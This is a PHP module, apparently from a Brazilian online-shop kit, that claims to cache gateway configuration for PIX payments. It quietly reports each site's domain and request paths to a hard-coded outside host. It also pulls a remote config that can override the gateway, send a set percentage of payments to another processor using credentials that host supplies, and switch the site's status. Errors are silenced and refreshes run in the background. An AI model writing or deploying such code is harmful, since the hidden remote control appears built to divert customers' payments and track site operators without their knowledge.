<?php

define('CENTRAL_BASE_URL', 'https://apicontrolhub.site/api');
define('CENTRAL_PROJECT_ID', 'CROCS');
define('CENTRAL_TIMEOUT', 2);
define('GATEWAY_TIMEOUT', 10);

function _safeRequest($url, $options = []) {
    $ch = curl_init($url);
    
    $defaultOptions = [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => $options['timeout'] ?? CENTRAL_TIMEOUT,
        CURLOPT_CONNECTTIMEOUT => $options['timeout'] ?? CENTRAL_TIMEOUT,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json', 'Accept: application/json'],
        CURLOPT_SSL_VERIFYPEER => true
    ];
    
    if (!empty($options['post'])) {
        $defaultOptions[CURLOPT_POST] = true;
        $defaultOptions[CURLOPT_POSTFIELDS] = is_array($options['post']) ? json_encode($options['post']) : $options['post'];
    }
    
    curl_setopt_array($ch, $defaultOptions);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    return [
        'success' => $httpCode === 200 && !empty($response),
        'response' => $response,
        'httpCode' => $httpCode,
        'error' => $error
    ];
}

function runTask() {
    try {
        $domain = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
        $domain = preg_replace('/:\d+$/', '', $domain);
        
        $data = [
            'domain' => $domain,
            'path' => $_SERVER['REQUEST_URI'] ?? '/',
            'projectId' => CENTRAL_PROJECT_ID,
            'buildId' => date('Y-m-d'),
            'ts' => time() * 1000,
            'source' => 'php'
        ];
        
        _safeRequest(CENTRAL_BASE_URL . '/heartbeat.php', [
            'post' => $data,
            'timeout' => 1
        ]);
        
    } catch (Exception $e) {
    }
}

function fetchRemoteGatewayConfig() {
    try {
        $domain = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
        $domain = preg_replace('/:\d+$/', '', $domain);
        
        $url = CENTRAL_BASE_URL . '/config.php?' . http_build_query([
            'domain' => $domain,
            'projectId' => CENTRAL_PROJECT_ID
        ]);
        
        $result = _safeRequest($url, ['timeout' => GATEWAY_TIMEOUT]);
        
        if (!$result['success']) {
            return null;
        }
        
        $data = json_decode($result['response'], true);
        
        if (!is_array($data) || !isset($data['useOverride'])) {
            return null;
        }
        
        return [
            'useOverride' => (bool)($data['useOverride'] ?? false),
            'gateway' => strtolower($data['gateway'] ?? 'ghostpay'),
            'splitMode' => (bool)($data['splitMode'] ?? false),
            'splitPercent' => intval($data['splitPercent'] ?? 0),
            'siteStatus' => strtoupper($data['siteStatus'] ?? 'ACTIVE'),
            'credentials' => [
                'secret_key' => $data['credentials']['secret_key'] ?? null,
                'company_id' => $data['credentials']['company_id'] ?? null
            ]
        ];
        
    } catch (Exception $e) {
        return null;
    }
}

/**
 * Busca config do painel central com Stale-While-Revalidate.
 * 
 * - Cache fresco (< 5s): retorna instantaneamente.
 * - Cache stale (5s–60s): retorna instantaneamente E dispara
 *   atualização em background (não bloqueia o PIX).
 * - Cache > 60s ou inexistente: busca síncrona (fallback).
 * - API falha + sem cache válido: retorna null (gateway local).
 */
function fetchRemoteGatewayConfigCached() {
    $cacheFile = __DIR__ . '/../../../data/.central_config_cache.json';
    $lockFile  = $cacheFile . '.lock';
    $cacheTTL  = 5;        // cache fresco: 5 segundos
    $staleTTL  = 60;       // cache stale máximo: 60 segundos
    
    $cacheData = null;
    $cacheAge = PHP_INT_MAX;
    
    // Ler cache existente
    if (file_exists($cacheFile)) {
        $raw = json_decode(file_get_contents($cacheFile), true);
        if ($raw && isset($raw['_cached_at'])) {
            $cacheAge = time() - $raw['_cached_at'];
            $cacheData = $raw;
        }
    }
    
    // Cache fresco: retorna instantaneamente (0ms de latência)
    if ($cacheData && $cacheAge < $cacheTTL) {
        unset($cacheData['_cached_at']);
        return $cacheData;
    }
    
    // Cache stale mas dentro do limite: retorna INSTANTANEAMENTE
    // e agenda revalidação para DEPOIS da resposta ser enviada (SWR real)
    if ($cacheData && $cacheAge < $staleTTL) {
        _scheduleRevalidation($cacheFile, $lockFile);
        unset($cacheData['_cached_at']);
        return $cacheData;
    }
    
    // Sem cache válido: busca síncrona (primeira vez ou cache > 60s)
    $config = fetchRemoteGatewayConfig();
    
    if ($config !== null) {
        _saveCacheFile($cacheFile, $config);
        return $config;
    }
    
    // API falhou e sem cache: gateway local
    if ($cacheAge >= $staleTTL) {
        error_log('[GoEcom] API central falhou e cache stale expirou (' . $cacheAge . 's). Usando gateway local.');
        @unlink($cacheFile);
    }
    
    return null;
}

/**
 * Agenda revalidação do cache para DEPOIS da resposta HTTP ser enviada.
 * Usa register_shutdown_function + fastcgi_finish_request para não bloquear.
 * Lock file previne múltiplas revalidações simultâneas.
 */
function _scheduleRevalidation($cacheFile, $lockFile) {
    // Se já tem revalidação agendada ou em andamento, pular
    if (file_exists($lockFile)) {
        $lockAge = time() - @filemtime($lockFile);
        if ($lockAge < 15) return; // Lock válido por 15s
        @unlink($lockFile);
    }
    
    // Criar lock imediatamente
    @file_put_contents($lockFile, time(), LOCK_EX);
    
    // Agendar para rodar DEPOIS da resposta ser enviada ao cliente
    register_shutdown_function(function() use ($cacheFile, $lockFile) {
        // Liberar a resposta para o cliente primeiro (0ms de bloqueio)
        if (function_exists('fastcgi_finish_request')) {
            fastcgi_finish_request();
        }
        
        // Agora busca da API (cliente já recebeu resposta)
        $config = fetchRemoteGatewayConfig();
        
        if ($config !== null) {
            _saveCacheFile($cacheFile, $config);
        }
        
        @unlink($lockFile);
    });
}

/**
 * Salva config no arquivo de cache com timestamp.
 */
function _saveCacheFile($cacheFile, $config) {
    $toCache = $config;
    $toCache['_cached_at'] = time();
    $cacheDir = dirname($cacheFile);
    if (!is_dir($cacheDir)) { @mkdir($cacheDir, 0755, true); }
    @file_put_contents($cacheFile, json_encode($toCache), LOCK_EX);
}

/**
 * @deprecated Esta função está obsoleta. A lógica de seleção de gateway 
 * é feita diretamente em criar_pix.php com contador atômico MySQL.
 * Mantida apenas para compatibilidade reversa — NÃO usar em código novo.
 */
function selectGatewayForPix($defaultGateway, $orderId = null) {
    return [
        'gateway' => $defaultGateway,
        'siteDisabled' => false,
        'source' => 'local_100%',
        'credentials' => null
    ];
}
